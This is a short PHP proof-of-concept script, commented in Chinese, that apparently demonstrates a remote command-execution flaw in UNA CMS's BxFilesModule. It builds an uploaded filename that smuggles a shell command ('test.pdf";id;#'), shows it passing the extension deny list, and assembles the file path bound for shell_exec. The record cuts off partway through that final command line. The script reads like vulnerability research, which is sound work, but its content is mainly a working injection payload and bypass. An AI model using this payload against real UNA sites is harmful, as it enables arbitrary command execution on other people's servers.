<?php
echo "========================================\n";
echo " UNA CMS BxFilesModule RCE - 完整验证\n";
echo "========================================\n\n";

// 攻击者上传的文件名
$evil_filename = "test.pdf\";id;#";
echo "[1] 攻击者上传文件名: $evil_filename\n";

// Step 1: BxDolStorage::getFileExt
$ext = strtolower(pathinfo($evil_filename, PATHINFO_EXTENSION));
echo "[2] pathinfo 提取扩展名: \n";
echo "    shell 字符被保留! \" ; # 全部存在\n\n";

// Step 2: isValidExt - 模拟 ext_deny 列表
$ext_deny = explode(",", "php,exe,bat,cmd,sh,pl,py,js,vbs,ps1,com,pif,scr,hta,cp l,cpl,msi,msp,reg,jar,swf,ade,adp,app,asp,bas,cer,chm,crt,csr,der,fxp,gadget,hlp,hpj,inf,ins,isp,its,jse,ksh,lnk,mad,maf,mag,mam,maq,mar,mas,mat,mau,mav,maw,mda,mdb,mde,mdt,mdw,mdz,msc,msh,msh1,msh2,mshxml,msh1xml,msh2xml,msp,ops,pcd,prf,prg,pst,scf,sct,shb,shs,tmp,url,vb,vbe,vbs,vsmacros,vss,vst,vsw,ws,wsc,wsf,wsh,xnk");
$is_denied = in_array($ext, $ext_deny);
echo "[3] isValidExt 检查: in_array(\$ext, ext_deny)\n";
echo "    ext_deny 列表: " . count($ext_deny) . " 项\n";
echo "     在 deny 列表中? " . ($is_denied ? "YES (拒绝)" : "NO (通过!)") . "\n";
echo "    → 绕过 " . ($is_denied ? "失败" : "成功 ✓") . "\n\n";

// Step 3: 模拟命令拼接 (BxFilesModule:242)
$remoteId = "abc123";
$sFilePath = "/var/www/html/tmp/" . $remoteId . "." . $ext;
echo "[4] \$sFilePath 拼接: $sFilePath\n";
echo "    注意双引号: 路径中的 \" 会闭合外层引号\n\n";

// Step 4: 模拟 shell_exec (BxFilesModule:249)
$sCommand = java
